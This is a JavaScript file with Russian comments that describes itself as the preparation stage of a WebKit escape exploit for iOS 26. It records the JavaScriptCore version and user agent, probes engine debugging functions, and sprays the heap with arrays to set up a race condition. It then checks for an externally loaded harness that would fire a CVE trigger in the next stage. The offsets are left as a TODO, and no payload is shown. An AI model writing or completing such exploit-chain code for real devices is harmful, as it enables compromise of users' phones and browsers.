// ios26_webkit_hook.js — hook WebKit/JSC для подготовки WebKit-escape.
//
// Задаёт условия для триггера CVE (stage 3):
//   - фиксирует версию JSC (JSC.version / navigator.userAgent)
//   - проверяет доступность describe() / JSC.dumpAirGraphAtEachPhase (jsc-only)
//   - готовит heap (Eden GC) под race
//   - вызывает window.__ios26_loadHarness(cassowary_src)
//
// TODO: offsets JSCell header для целевой версии (x86_64 vs arm64).

'use strict';

(function () {
    function log(...a) { console.log('[webkit-hook]', ...a); }

    log('JSC version:', (typeof JSC !== 'undefined') ? JSC.version : 'n/a (browser)');
    log('UA:', navigator.userAgent);

    // Диагностика: jsc-only API
    log('describe():', typeof describe);
    log('JSC.dumpAirGraphAtEachPhase:',
        (typeof JSC !== 'undefined') ? typeof JSC.dumpAirGraphAtEachPhase : 'n/a');

    // Подготовка heap: Eden GC (чистый heap под race)
    for (let t = 0; t < 0x10000; t++) new Array(13.37, 13.37, 13.37, 13.37);
    log('heap prepared (Eden GC)');

    // Запуск harness (cassowary_harness.js) — передаётся извне
    if (typeof window.__ios26_loadHarness === 'function') {
        log('ready for stage 3: window.__ios26_loadHarness(cassowary_src)');
    } else {
        log('WARN: __ios26_loadHarness не найден (stage 1 не прошёл?)');
    }
})();
